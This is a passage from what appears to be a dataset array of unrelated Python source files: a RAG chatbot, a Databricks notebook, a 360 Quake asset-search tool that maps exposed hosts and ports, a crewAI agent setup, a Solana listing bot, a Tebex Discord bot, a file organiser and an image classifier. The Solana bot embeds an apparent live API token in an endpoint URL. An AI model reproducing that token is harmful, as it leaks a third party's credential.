patient\"):\n        embedding_model=HuggingFaceInstructEmbeddings(model_name=\"hkunlp/instructor-large\", model_kwargs={\"device\": \"cuda\"})\n    return embedding_model\n\n# Class for chatting with pcap data\nclass ChatWithDocuments:\n    def __init__(self, file_path, file_type):\n        self.embedding_model = load_model()\n        self.file_path = file_path\n        self.file_type = file_type\n        self.load_document()\n        self.llm = Ollama(model=st.session_state['selected_model'], base_url=\"http://ollama:11434\")\n        self.document_cluster_mapping = {}\n        self.conversation_history = []\n        self.split_into_chunks()        \n        self.root_node = None\n        self.create_leaf_nodes()\n        self.build_tree()  # This will build the tree\n        self.store_in_chroma()\n        self.setup_conversation_memory()\n        self.setup_conversation_retrieval_chain()\n\n    def load_document(self):\n        self.loader = FILE_LOADERS[self.file_type](file_path=self.file_path)\n        self.pages = self.loader.load_and_split()\n\n    def split_into_chunks(self):\n        self.text_splitter = SemanticChunker(self.embedding_model)\n        self.docs = self.text_splitter.split_documents(self.pages)\n\n    def create_leaf_nodes(self):\n        self.leaf_nodes = [Node(text=doc.page_content) for doc in self.docs]\n        self.embed_leaf_nodes()\n        st.write(f\"Leaf nodes created. Total count: {len(self.leaf_nodes)}\")\n\n    def embed_leaf_nodes(self):\n        for leaf_node in self.leaf_nodes:\n            try:\n                embedding = self.embedding_model.embed_query(leaf_node.text)\n                if embedding is not None and not np.isnan(embedding).any():\n                    leaf_node.embedding = embedding\n                else:\n                    # Handle the case where embedding is nan or None\n                    st.write(f\"Invalid embedding generated for leaf node with text: {leaf_node.text}\")\n            except Exception as e:\n                st.write(f\"Error embedding leaf node: {e}\")\n\n    def determine_initial_clusters(self, nodes):\n        # This is a simple heuristic: take the square root of the number of nodes,\n        # capped at a minimum of 2 and a maximum that makes sense for your application.\n        return max(2, int(len(nodes)**0.5))\n\n    def cluster_nodes(self, nodes, n_clusters=2):\n        st.write(f\"Clustering {len(nodes)} nodes into {n_clusters} clusters...\")\n        embeddings = np.array([node.embedding for node in nodes if node.embedding is not None])\n        st.write(\"Embeddings as of Cluster Nodes:\", embeddings)\n        # Check if embeddings is empty\n        if embeddings.size == 0:\n            # Handle the case where there are no embeddings to cluster\n            # This could be logging a warning and returning the nodes as a single cluster or any other logic you see fit\n            st.write(\"Warning: No valid embeddings found for clustering. Returning nodes as a single cluster.\")\n            return [nodes]  # Return all nodes as a single cluster to avoid crashing\n\n        # Check if embeddings is not empty but a 1D array, reshape it\n        if embeddings.ndim == 1:\n            embeddings = embeddings.reshape(-1, 1)\n\n        # Proceed with KMeans clustering\n        kmeans = KMeans(n_clusters=n_clusters, random_state=0)\n        try:\n            kmeans.fit(embeddings",
    "# Databricks notebook source\n# MAGIC %md\n# MAGIC # This notebook is used to:\n# MAGIC - #### Copy pulse data to Unity Catalog Volume\n# MAGIC - #### Create Bronze layer table\n# MAGIC - #### Transform the pulse data\n# MAGIC - #### Create Silver layer table\n\n# COMMAND ----------\n\n\n# DBTITLE 1,Setup Variables\n# input your details\nusername = f\"odl_instructor_1280678@databrickslabs.com\"\nuser_prefix = f\"kb\"\n\n# Setup all required paths\nsource_repo_path = f\"/Workspace/Repos/{username}/de-training/DE Training Pulse Check (Responses) - Form Responses 1.csv\"\nmy_catalog = f\"{user_prefix}_utrecht_training\"\nmy_volume = f\"pulse_check\"\ntarget_file_path = f\"/Volumes/{my_catalog}/bronze/{my_volume}/pulse_data.csv\"\n\n# COMMAND ----------\n\n# DBTITLE 1,Create Catalog, Schema and Volume\ncatalog_sql = f\"CREATE CATALOG IF NOT EXISTS {my_catalog}\"\nspark.sql(catalog_sql)\n\nschema_list = ['bronze', 'silver', 'gold']\nfor schema in schema_list:\n    schema_sql = f\"CREATE SCHEMA IF NOT EXISTS {my_catalog}.{schema}\"\n    spark.sql(schema_sql)\n\nvolume_sql = f\"CREATE VOLUME IF NOT EXISTS {my_catalog}.bronze.{my_volume}\"\nspark.sql(volume_sql)\n\n# COMMAND ----------\n\n# DBTITLE 1,Copy raw pulse csv to UC Volume\nimport os\nimport shutil\n\n# Move the source file to the target path\nshutil.copy(source_repo_path, target_file_path)\n\n# COMMAND ----------\n\n# DBTITLE 1,Create Bronze Table\nfrom pyspark.sql.types import StructType, StructField, StringType, IntegerType, FloatType, TimestampType\n\n# Provide the schema\nschema = StructType([\n    StructField(\"created_at\", StringType(), True),\n    StructField(\"job_role\", StringType(), True),\n    StructField(\"training_type\", StringType(), True),\n    StructField(\"databricks_knowledge\", StringType(), True),\n    StructField(\"favorite_city\", StringType(), True),\n    # Add as many fields as you have in your CSV\n])\n\n# Read the pulse data csv\nbronze_df = spark.read.options(multiline = True, delimiter=\",\", header=True).schema(schema).csv(target_file_path)\n\n# Save as bronze table\nbronze_df.write.mode(\"overwrite\").saveAsTable(f\"{my_catalog}.bronze.raw_pulse_data\")\n\n# COMMAND ----------\n\n# DBTITLE 1,Create Silver Table\nfrom pyspark.sql.functions import split\n\nsilver_df = spark.read.table(f\"{my_catalog}.bronze.raw_pulse_data\")\n\n# Split the 'favorite_city' column into two parts: 'city' and 'rating'\n# The split function uses a regex pattern that looks for a hyphen possibly surrounded by spaces\nsplit_col = split(silver_df['favorite_city'], ' - | -|-|- ')\n\n# Add the split columns to the DataFrame\nsilver_df = silver_df.withColumn('city', split_col.getItem(0))\nsilver_df = silver_df.withColumn('rating', split_col.getItem(1))\n\n# The 'rating' column is currently of type string, convert it to integer\ntransfomed_df = silver_df.withColumn(\"rating\", silver_df[\"rating\"].cast(IntegerType()))\n\n# Save as silver table\ntransfomed_df.write.mode(\"overwrite\").saveAsTable(f\"{my_catalog}.silver.transformed_pulse_data\")\n",
    "import argparse\r\nimport requests\r\nimport json\r\nimport pandas as pd\r\nimport os\r\nimport sqlite3\r\nfrom prettytable import PrettyTable\r\nimport dns.resolver\r\nfrom geopy.geocoders import Nominatim\r\n\r\n# \u5b9a\u4e49\u5e38\u91cf\u5217\u8868\uff0c\u5305\u542b\u5e38\u89c1\u7684CDN\u670d\u52a1\u5546\u540d\u79f0\r\nCOMMON_CDN_NAMES = [\"cloudflare\", \"akamai\", \"fastly\", \"maxcdn\", \"cloudfront\", \"azure cdn\", \"google cloud cdn\", \"stackpath\", \"limelight\", \"incapsula\"]  # \u6839\u636e\u9700\u8981\u6dfb\u52a0\u66f4\u591aCDN\u670d\u52a1\u5546\u540d\u79f0\r\n\r\nclass QuakeQuery:\r\n    def __init__(self, api_key):\r\n        self.api_key = api_key\r\n        self.conn = None\r\n        self.geolocator = Nominatim(user_agent=\"GUI_Enterprise_TI\")\r\n\r\n    def check_cdn_usage(self, hostname):\r\n        ipv4_addresses = []\r\n        resolver = dns.resolver.Resolver()\r\n        answers = resolver.resolve(hostname, 'A')\r\n\r\n        for answer in answers:\r\n            ipv4_addresses.append(answer.address)\r\n\r\n        return len(ipv4_addresses) >= 2\r\n\r\n    def connect_to_database(self, db_name=\"quake_results.db\"):\r\n        self.conn = sqlite3.connect(db_name)\r\n        self.cursor = self.conn.cursor()\r\n        self.create_table()\r\n\r\n    def create_table(self):\r\n        self.cursor.execute(\"\"\"\r\n            CREATE TABLE IF NOT EXISTS quake_results (\r\n                id INTEGER PRIMARY KEY AUTOINCREMENT,\r\n                hostname TEXT NOT NULL,\r\n                ip TEXT NOT NULL,\r\n                port INTEGER NOT NULL\r\n            )\r\n        \"\"\")\r\n        self.conn.commit()\r\n\r\n    def store_to_database(self, results):\r\n        insert_query = \"\"\"\r\n            INSERT INTO quake_results (hostname, ip, port) VALUES (?, ?, ?)\r\n        \"\"\"\r\n        rows_to_insert = [(item[\"service\"][\"http\"][\"host\"], item[\"ip\"], item[\"port\"]) for item in results]\r\n\r\n        self.cursor.executemany(insert_query, rows_to_insert)\r\n        self.conn.commit()\r\n\r\n    def perform_search(self, query, result_count, start_page):\r\n        headers = {\"X-QuakeToken\": self.api_key}\r\n        payload = {\r\n            \"query\": query,\r\n            \"start\": start_page,\r\n            \"size\": str(result_count),\r\n        }\r\n\r\n        try:\r\n            response = requests.post(\r\n                url=\"https://quake.360.cn/api/v3/search/quake_service\",\r\n                headers=headers,\r\n                json=payload,\r\n            )\r\n            response.raise_for_status()\r\n            return json.loads(response.text)\r\n        except requests.RequestException as e:\r\n            print(f\"API\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef: {e}\")\r\n            raise\r\n\r\n    def identify_cdn_provider(self, hostname):\r\n            url = f\"http://{hostname}\"\r\n            try:\r\n                response = requests.get(url, timeout=5)\r\n                response.raise_for_status()\r\n\r\n                server_header = response.headers.get(\"Server\", \"\").lower()\r\n                for cdn_name in COMMON_CDN_NAMES:\r\n                    if cdn_name.lower() in server_header:\r\n                        return cdn_name\r\n\r\n            except (requests.exceptions.RequestException, requests.exceptions.HTTPError):\r\n                pass\r\n            return None\r\n\r\n    def display_results(self, api_response, start_page, result_count, query_term):\r\n            print(\"\\n\")\r\n            print(f\"\u9875\u7801\uff1a\u7b2c{api_response['meta']['pagination']['page_index']}\u9875 \u5171\"\r\n                f\"{api_response['meta']['pagination']['page_size']}\u9875 \u603b\u6570\u91cf\uff1a\"\r\n                f\"{api_response['meta']['pagination']['total']}\u4e2a\")\r\n            print(f\"\u67e5\u8be2\u5185\u5bb9\uff1a{query_term}\")\r\n\r\n            table = PrettyTable([\"\u5e8f\u53f7\", \"\u5730\u5740\", \"IP\",  \"\u7aef\u53e3\",\"IP\u4f4d\u7f6e\", \"CDN\u670d\u52a1\u5546\"])\r\n\r\n            for index, item in enumerate(api_response[\"data\"], start=1):\r\n                if \"http\" in item[\"service\"]:\r\n                    hostname = item[\"service\"][\"http\"][\"host\"]\r\n\r\n                    if self.check_cdn_usage(hostname):\r\n                        cdn_provider = self.identify_cdn_provider(hostname)\r\n                    else:\r\n                        cdn_provider = \"\u672a\u77e5\"\r\n\r\n                    ip_address = item[\"ip\"]\r\n                    location = self.get_ip_location(ip_address)  # \u83b7\u53d6IP\u4f4d\u7f6e\u4fe1\u606f\r\n\r\n                    table.add_row([\r\n                        index,\r\n                        hostname,\r\n                        ip_address,\r\n                        item[\"port\"],\r\n                        location or \"\u672a\u77e5\",\r\n                        cdn_provider,\r\n                    ])\r\n                else:\r\n                    print(f\"\u8b66\u544a\uff1a\u7b2c{index}\u6761\u7ed3\u679c\u7684'service'\u7ed3\u6784\u4e2d\u7f3a\u5c11'http'\u5b50\u9879\uff0c\u8df3\u8fc7\u8be5\u6761\u8bb0\u5f55\u3002\")\r\n\r\n            print(table)\r\n\r\n    def get_ip_location(self, ip_address):\r\n        print(\"\u67e5\u8be2\u4e2d...\", end=\"\\r\")\r\n        location = self._get_ip_location_with_ip_api(ip_address)\r\n        if location is None:\r\n            location = self._get_ip_location_with_geopy(ip_address)\r\n        print(\" \" * 20, end=\"\\r\")  # \u6e05\u9664\u201c\u67e5\u8be2\u4e2d...\u201d\u5e76\u56de\u8f66\r\n        return location\r\n\r\n    def _get_ip_location_with_geopy(self, ip_address):\r\n        try:\r\n            location = self.geolocator.reverse(ip_address, language=\"zh-CN\")\r\n            return location.address\r\n        except Exception as e:\r\n            print(f\"\u4f7f\u7528geopy\u83b7\u53d6IP {ip_address} \u4f4d\u7f6e\u4fe1\u606f\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\r\n            ",
    "import os\nfrom crewai import Agent, Task, Crew, Process\nfrom crewai_tools import SerperDevTool\nfrom langchain_openai import ChatOpenAI\nfrom langchain.agents import load_tools\nfrom myfunc.varvars_dicts import work_vars\n\nos.environ[\"OPENAI_MODEL_NAME\"] =work_vars[\"names\"][\"openai_model\"]  # Adjust based on available model\nsearch_tool = SerperDevTool()\nhuman_tools = load_tools([\"human\"])\n# Define your agents with roles and goals\n\nimport json  # Import the JSON module to parse JSON strings\nfrom langchain_core.agents import AgentFinish\n\nagent_finishes  = []\n\nfrom typing import Union, List, Tuple, Dict\n\n\ncall_number = 0\n\ndef print_agent_output(agent_output: Union[str, List[Tuple[Dict, str]], AgentFinish], agent_name: str = 'Generic call'):\n    global call_number  # Declare call_number as a global variable\n    call_number += 1\n    with open(\"crew_callback_logs.txt\", \"a\", encoding = \"utf-8\") as log_file:\n        # Try to parse the output if it is a JSON string\n        if isinstance(agent_output, str):\n            try:\n                agent_output = json.loads(agent_output)  # Attempt to parse the JSON string\n            except json.JSONDecodeError:\n                pass  # If there's an error, leave agent_output as is\n\n        # Check if the output is a list of tuples as in the first case\n        if isinstance(agent_output, list) and all(isinstance(item, tuple) for item in agent_output):\n            print(f\"-{call_number}----Dict------------------------------------------\", file=log_file)\n            for action, description in agent_output:\n                # Print attributes based on assumed structure\n                print(f\"Agent Name: {agent_name}\", file=log_file)\n                print(f\"Tool used: {getattr(action, 'tool', 'Unknown')}\", file=log_file)\n                print(f\"Tool input: {getattr(action, 'tool_input', 'Unknown')}\", file=log_file)\n                print(f\"Action log: {getattr(action, 'log', 'Unknown')}\", file=log_file)\n                print(f\"Description: {description}\", file=log_file)\n                print(\"--------------------------------------------------\", file=log_file)\n\n        # Check if the output is a dictionary as in the second case\n        elif isinstance(agent_output, AgentFinish):\n            print(f\"-{call_number}----AgentFinish---------------------------------------\", file=log_file)\n            print(f\"Agent Name: {agent_name}\", file=log_file)\n            agent_finishes.append(agent_output)\n            # Extracting 'output' and 'log' from the nested 'return_values' if they exist\n            output = agent_output.return_values\n            # log = agent_output.get('log', 'No log available')\n            print(f\"AgentFinish Output: {output['output']}\", file=log_file)\n            # print(f\"Log: {log}\", file=log_file)\n            # print(f\"AgentFinish: {agent_output}\", file=log_file)\n            print(\"--------------------------------------------------\", file=log_file)\n\n        # Handle unexpected formats\n        else:\n            # If the format is unknown, print out the input directly\n            print(f\"-{call_number}-Unknown format of agent_output:\", file=log_file)\n            print(type(agent_output), file=log_file)\n            print(agent_output, file=log_file)\n\n\n\n\n\ntopic_getter = Agent(\n    role='A Senior customer communicator',\n    goal='consult with the human customer to get the topic and areas of interest for doing the research',\n    backstory=\"\"\"As a top customer communicator at a renowned technology you have honed your skills\n    in consulting with a customer to understand their needs and goals for what research is needed.\"\"\",\n    verbose=True,\n    allow_delegation=False,\n    step_callback=lambda x: print_agent_output(x,\"Senior Customer Agent\"),\n    max_iter=5,\n    memory=True,\n    tools= human_tools, # Passing human tools to the agent,\n)\n\nresearcher = Agent(\n  role='Senior Research Analyst',\n  goal='Uncover cutting-edge developments in Digital transformation, especially in the Serbian market',\n  backstory=\"\"\"You work at a leading tech think tank.\n  Your expertise lies in identifying emerging trends.\n  You have a knack for dissecting complex data and presenting actionable insights. You have the ability to take a topic suggested by a human and\n    rewrite multiple searches for that topic to get the best results overall.\"\"\",\n  verbose=True,\n  allow_delegation=False,\n  step_callback=lambda x: print_agent_output(x,\"Senior Research Analyst Agent\"),\n  memory = True,\n  tools=[search_tool]\n\n)\n\nwriter = Agent(\n  role='Tech Content Strategist',\n  goal='Craft compelling content on Digital Transformation advancements',\n  backstory=\"\"\"You are a renowned Content Strategist, known for your insightful and engaging articles.\n  You transform complex concepts into compelling narratives.\"\"\",\n  verbose=True,\n  memory=True,\n  step_callback=lambda x: print_agent_output(x,\"Content Writer Agent\"),\n  allow_delegation=True\n)\n\n# Create tasks for your agents\n\nget_human_topic = Task(\n  description=f\"\"\"ASK THE ",
    "# SOLANA RADYIUM DEX LISTINGS BOT!\n\n# TODO Add Buys, Sells price and liquidity pool tracking management\n\nimport asyncio\nimport sys\nimport websockets\nfrom websockets.exceptions import ConnectionClosedError\nimport json\nfrom solana.rpc.api import Client\nfrom solders.pubkey import Pubkey\nfrom solders.signature import Signature\nimport pandas as pd\nfrom tabulate import tabulate\nimport time\nimport threading\nimport telegram\nimport queue\nfrom collections import deque\nfrom dexscreener import DexscreenerClient\nfrom dexscreener.models import TokenPair\nfrom helpers import printd\nimport datetime\nimport os\n\nwallet_address = \"675kPX9MHTjS2zt1qfr1NYHuzeLXfQM9H24wFSUt1Mp8\"\nseen_signatures = set()\n\nsolana_client = Client(\"https://api.mainnet-beta.solana.com\")\nsolana_client_quicknode = Client(\n    \"https://cosmopolitan-black-county.solana-mainnet.quiknode.pro/459c5dee18af06e260c66b38364130cff93c4d54/\")\nsolana_client_devnet = Client(\"https://api.devnet.solana.com\")\nsolana_client_testnet = Client(\"https://api.testnet.solana.com\")\n\n\nclass RaydiumListingDataCollector:\n\n    def __init__(self):\n        self.solana_client_quicknode = solana_client_quicknode\n        self.all_coins_data = {}\n        self.dexscreener_client = DexscreenerClient()\n        self.seen_signatures = seen_signatures\n        self.data_queue = queue.Queue()\n        self.new_listings_queue = queue.Queue()\n        self.new_listing_raydium_queue = queue.Queue()\n        self.new_algo_signal_queue = queue.Queue()\n        self.raydiumi_listing_addresses_2h = {}\n        self.raydium_listing_addresses_2h = deque(maxlen=2000)\n        self.data_frame = {}\n        self.sent = False\n\n    async def getTokens(self, str_signature):\n\n        signature = Signature.from_string(str_signature)\n        transaction = solana_client_quicknode.get_transaction(signature, encoding=\"jsonParsed\",\n                                                              max_supported_transaction_version=0).value\n        try:\n            instruction_list = transaction.transaction.transaction.message.instructions\n            for instructions in instruction_list:\n                if instructions.program_id == Pubkey.from_string(wallet_address):\n                    print(\"============NEW POOL DETECTED====================\")\n                    Token0 = instructions.accounts[8]\n                    Token1 = instructions.accounts[9]\n                    # Your data\n                    data = {'Token_Index': ['Token0', 'Token1'],\n                            'Account Public Key': [Token0, Token1]}\n                    df = pd.DataFrame(data)\n                    table = tabulate(df, headers='keys', tablefmt='fancy_grid')\n                    print(table)\n\n                    if str(Token0) == 'So11111111111111111111111111111111111111112':\n                        self.new_listings_queue.put(Token1)\n                    else:\n                        self.new_listings_queue.put(Token0)\n\n        except AttributeError as e:\n            print(e)\n\n    async def check_queue(self):\n\n        if self.new_listing_raydium_queue.empty():\n            print(\"NO NEW LISTINGS!\")\n        else:\n            print(\"NEW LISTING!\")\n            new_coin = self.new_listing_raydium_queue.get()\n            print(f\"New Raydium Listing Coin: {new_coin[0]}\")\n            print(f\"Pair Address: {new_coin[1]}\")\n            print(f\"Base Token Address: {new_coin[2]}\")\n            print(f\"URL: {new_coin[3]}\")\n\n    async def run(self):\n        while True:\n            try:\n                uri = \"wss://api.mainnet-beta.solana.com\"\n                count = 0\n                ### GET YOUR OWN SOLANA MAINNET WEBSOCKET URI FROM QUICKNODE !!!\n                quicknode_uri = \"###YOURQUICKNODESOLANAMAINNETWEBSOCKETURI###\"\n                async with websockets.connect(quicknode_uri) as websocket:\n                    # Send subscription request\n                    await websocket.send(json.dumps({\"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"logsSubscribe\",\n                                                     \"params\": [{\"mentions\": [wallet_address]},\n                                                                {\"commitment\": \"finalized\"}]}))\n                    first_resp = await websocket.recv()\n                    response_dict = json.loads(first_resp)\n\n                    if 'result' in response_dict:\n                        print(\"Subscription successful. Subscription ID: \", response_dict['result'])\n\n                    async for response in websocket:\n                        response_dict = json.loads(response)\n                        if count % 200 == 0:\n                            await self.check_queue()\n                        if count % 800 == 0:\n                            print(response_dict)\n                        count += 1\n                        if response_dict['params']['result']['value']['err'] == None:\n                            signature = response_dict['params']['result']['value']['signature']\n                            if signature not in self.seen_",
    "import discord\nimport os\nimport requests\nfrom discord.ext import commands\nfrom dotenv import load_dotenv\nfrom datetime import datetime, timedelta\n\n\nload_dotenv()\n\nTOKEN = os.getenv('DISCORD_TOKEN')\nTEBEX_SECRET = os.getenv('TEBEX_SECRET')\nADMIN_ROLE_IDS = [int(role_id) for role_id in os.getenv('ADMIN_ROLE_IDS').split(',')]\n\nbot = commands.Bot(command_prefix='/', intents=discord.Intents.all())\n\ndef is_admin(ctx):\n    return any(role.id in ADMIN_ROLE_IDS for role in ctx.author.roles)\n\n@bot.slash_command(name='verify', description='Get payment info from Transaction ID')\n@commands.check(is_admin)\nasync def kakunin(ctx, transaction_id: discord.Option(str, \"Transaction ID\")):\n    url = f'https://plugin.tebex.io/payments/{transaction_id}'\n    key = {'X-Tebex-Secret': TEBEX_SECRET}\n    response = requests.get(url, headers=key)\n\n    if response.status_code == 200:\n        data = response.json()\n\n        # Convert the date to UTC\n        date_str = data['date']\n        date_utc = datetime.strptime(date_str, \"%Y-%m-%dT%H:%M:%S%z\")\n        date_utc_str = date_utc.strftime(\"%Y-%m-%d %H:%M:%S\")\n\n        embed = discord.Embed(\n            title=f\"\ud83d\udd0d Information for {transaction_id}\",\n            description=\"Here are the details of the transaction:\",\n            color=discord.Color.blue()\n        )\n\n        embed.add_field(name=\"\ud83d\udcb0 Price\", value=data['amount'], inline=True)\n\n        status = data['status']\n        if status.lower() == 'complete':\n            status_text = f\"```\ud83d\udfe2 {status}```\"\n        else:\n            status_text = f\"```\ud83d\udd34 {status}```\"\n        embed.add_field(name=\"\ud83d\udcca Status\", value=status_text, inline=True)\n\n        embed.add_field(name=\"\ud83d\udcc5 Date (UTC)\", value=date_utc_str, inline=False)\n\n        player_name = data['player']['name']\n        embed.add_field(name=\"\ud83d\udc64 Tebex Username\", value=player_name, inline=False)\n\n        package_names = ', '.join([package['name'] for package in data['packages']])\n        embed.add_field(name=\"\ud83c\udf81 Package Name(s)\", value=package_names, inline=False)\n\n        embed.set_footer(\n            text=\"Powered By NickyBoy\",\n            icon_url=\"https://i.imgur.com/QfmDKS6.png\"\n        )\n\n        await ctx.respond(embed=embed)\n    else:\n        await ctx.respond('Failed to retrieve payment information.')\n\n\n@bot.slash_command(name='products', description='list of produscts on the store')\n@commands.check(is_admin)\nasync def products(ctx):\n    url = 'https://plugin.tebex.io/packages'\n    key = {'X-Tebex-Secret': TEBEX_SECRET}\n    response = requests.get(url, headers=key)\n\n    if response.status_code == 200:\n        packages = response.json()\n        embeds = []\n        current_embed = None\n\n        for index, package in enumerate(packages, start=1):\n            if index % 25 == 1:\n                if current_embed:\n                    embeds.append(current_embed)\n                current_embed = discord.Embed(title='Products', color=0XE16941, description='Here are the list of products on the store')\n\n            package_name = package['name']\n            package_price = package['price']\n            package_category = package['category']['name']\n            package_id = package['id']\n            package_info = f\"Price: {package_price}, ID: {package_id}, Category: {package_category}\"\n            current_embed.add_field(name=package_name, value=package_info, inline=False)\n\n        if current_embed:\n            embeds.append(current_embed)\n\n        if embeds:\n            for embed in embeds:\n                await ctx.respond(embed=embed)\n        else:\n            await ctx.respond('No products found.')\n    else:\n        await ctx.respond('Failed to retrieve product information.')\n\n@bot.slash_command(name='search', description='Get information from Tebex username')\n@commands.check(is_admin)\nasync def search(ctx, tebex_id: discord.Option(str, \"Tebex username\")):\n    url = f'https://plugin.tebex.io/user/{tebex_id}'\n    key = {'X-Tebex-Secret': TEBEX_SECRET}\n    response = requests.get(url, headers=key)\n\n    if response.status_code == 200:\n        data = response.json()\n        embed = discord.Embed(title=f'\ud83d\udd0dPlayer Information for {tebex_id}')\n        embed.add_field(name='\ud83d\udc64Username', value=data['player']['username'])\n        embed.add_field(name='\ud83d\udd28Ban Count', value=data['banCount'])\n        embed.add_field(name='\ud83d\udcb3Chargeback Rate', value=data['chargebackRate'])\n        total_purchases = '\\n'.join([f\"{currency}: {amount}\" for currency, amount in data['purchaseTotals'].items()])\n        embed.add_field(name='\ud83d\udcb5Total Purchases', value=total_purchases)\n\n        # Recent payment histories\n        payments = data['payments'][:5]  # Limit to the 5 most recent payments\n        payment_info = \"\"\n        for payment in payments:\n            txn_id = payment.get('txn_id', 'N/A')\n            timestamp = payment.get('time', 0)\n            price = payment.get('price', 'N/A')\n            currency = payment.get('currency', 'N/A')\n            status = payment.get('status', 'N/A')\n\n            # Convert the Unix timesta",
    "from pathlib import Path\nimport os\nimport shutil as s\n\ndownloads_path = str(Path.home() / \"Downloads\")\nunknown_types = fr'{downloads_path}\\UnknownTypes'\npdfs = fr'{downloads_path}\\PDFs'\ndocs = fr'{downloads_path}\\Documents'\npng = fr'{downloads_path}\\Pictures'\nexe = fr'{downloads_path}\\Apps'\nzip = fr'{downloads_path}\\Zipped'\nmp3 = fr'{downloads_path}\\Downloaded Music'\n\ndef make_dir() -> None:\n    make_Dir(unknown_types)\n    make_Dir(pdfs)\n    make_Dir(docs)\n    make_Dir(png)\n    make_Dir(exe)\n    make_Dir(zip)\n    make_Dir(mp3)\n\n\ndef make_Dir(dir) -> None:\n    if(os.path.exists(dir)):\n       print(\"Folder already exists\")\n    else:\n        print(f'Creating directory {dir} ...')\n        os.mkdir(dir)\n\n\ndef categorize_file(filename) -> str:\n    get_category = lambda ext: {\n        \".txt\": \"Text\",\n        \".docx\": \"Document\",\n        \".py\": \"Code\",\n        \".mp3\": \"MP3\",\n        \".png\": \"PNG\",\n        \".pdf\": \"PDF\",\n        \".exe\": \"Windows Application\",\n        \".zip\": \"ZIP File\"\n        }.get(ext, \"Unknown\")\n    return get_category(filename[filename.rfind(\".\"):])\n\n\ndef compare_extension(ext, item) -> None:\n    if(ext in unknown_types):\n        print(f'moving {ext} file extension to {unknown_types}')\n        s.move(fr'{downloads_path}\\{item}', unknown_types)\n    elif(ext in pdfs):\n        print(f'moving {ext} file extension to {pdfs}')\n        s.move(fr'{downloads_path}\\{item}', pdfs)\n    elif(ext in docs or ext.lower() == 'text'):\n        print(f'moving {ext} file extension to {docs}')\n        s.move(fr'{downloads_path}\\{item}', docs)\n    elif(ext.lower() == 'png'):\n        print(f'moving {ext} file extension to {png}')\n        s.move(fr'{downloads_path}\\{item}', png)\n    elif(ext.lower() == 'windows application'):\n        print(f'moving {ext} file extension to {exe}')\n        s.move(fr'{downloads_path}\\{item}', exe)\n    elif(ext.lower() == 'zip file'):\n        print(f'moving {ext} file extension to {zip}')\n        s.move(fr'{downloads_path}\\{item}', zip)\n    elif(ext.lower() == 'mp3'):\n        print(f'moving {ext} file extension to {mp3}')\n        s.move(fr'{downloads_path}\\{item}', mp3)\n    else:\n        print(f'{ext = } folder not found')\n\ndef send_item_to_compare() -> str:\n    dir_list = os.listdir(downloads_path)\n    for item in dir_list:\n        if(os.path.isdir(fr'{downloads_path}\\{item}')):\n            print(\"Item is a Folder\")\n        else:\n            extension = categorize_file(item)\n            compare_extension(extension, item)",
    "from torchvision import transforms\nimport torch\nfrom pathlib import Path\nfrom PIL import Image\nimport torchvision\nfrom imagenet_classes import imgnet_classes_path\n\n\n\n# Check if CUDA is available, else use CPU\ndevice = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n\n# Load Inception v3 model pretrained on ImageNet dataset\n# model = torch.hub.load('pytorch/vision:v0.10.0', 'inception_v3', pretrained=True)\nmodel = torchvision.models.inception_v3(weights=torchvision.models.Inception_V3_Weights.DEFAULT)\nmodel.eval()\n\nclass PrePro():\n    \"\"\"\n    This class performs all necessary preprocessing for user input images and provides probabilities using a pre-trained model.\n    \"\"\"\n    def preprocess(self, img, device=device):\n        \"\"\"\n        This function takes input data, processes it, and returns the processed data.\n\n        Parameters:\n        - img (numpy.ndarray): The input image data.\n        - device (str): The device to which the processed data will be moved. Defaults to the value of the 'device' variable.\n\n        Returns:\n        - input_batch (torch.Tensor): The processed image data as a batch tensor, ready for model input.\n        \"\"\"\n\n        # Convert the input image data to a PIL Image\n        input_image = Image.fromarray(img)\n        \n        # Apply transformations to the input image to prepare it for the model\n        input_tensor = self.transform_img(input_image)\n        \n        # Add a batch dimension to the input tensor and move it to the specified device\n        input_batch = input_tensor.unsqueeze(0).to(device)\n        \n        # Return the processed image data\n        return input_batch\n\n    \n    def transform_img(self, img):\n        \"\"\"\n        This function takes input data, transforms it, and returns the transformed data.\n\n        Parameters:\n        - img (PIL.Image): The input image data to be transformed.\n\n        Returns:\n        - transformed (torch.Tensor): The transformed image data.\n        \"\"\"\n\n        # Define the sequence of transformations to be applied to the input image\n        transform = transforms.Compose([\n            transforms.Resize(299),  # Resize the image to 299x299 pixels\n            transforms.CenterCrop(299),  # Crop the image to 299x299 pixels around the center\n            transforms.ToTensor(),  # Convert the image to a PyTorch tensor\n            transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),  # Normalize the image\n        ])\n\n        # Apply the defined transformations to the input image\n        transformed = transform(img)\n\n        # Return the transformed image data\n        return transformed\n\n\n    def predict(self, data):\n        \"\"\"\n        This function takes input data, feeds it into the model, and returns the model's output.\n\n        Parameters:\n        - data (tensor): The input data to be fed into the model.\n\n        Returns:\n        - output (tensor): The output tensor produced by the model.\n        \"\"\"\n        # Ensure that no gradients are calculated during inference\n        with torch.no_grad():\n            # Move the model to the appropriate device (CPU or GPU)\n            model.to(device)\n            # Feed the input data into the model and get the output\n            output = model(data)\n\n        # Return the model's output\n        return output\n\n    \n    def probability(self, output):\n        \"\"\"\n        This function calculates the probabilities for each category based on the model output.\n\n        Parameters:\n        - output (tensor): The output tensor from the model.\n\n        Returns:\n        - results (dict): A dictionary containing the top 5 categories with their corresponding probabilities.\n        \"\"\"\n        # Calculate probabilities\n        probabilities = torch.nn.functional.softmax(output[0], dim=0)\n\n        # Read categories from file\n        with open(imgnet_classes_path, \"r\") as f:\n            categories = [s.strip() for s in f.readlines()]\n\n        # Take top 5 probabilities and their corresponding category IDs\n        top5_prob, top5_catid = torch.topk(probabilities, 5)\n\n        # Initialize dictionary to store results\n        results = {}\n\n        # Loop through the top 5 probabilities\n        for i in range(top5_prob.size(0)):\n            # Assign category and its corresponding probability to the dictionary\n            results[categories[top5_catid[i]]] = top5_prob[i].item()\n\n        return results\n\n\n",
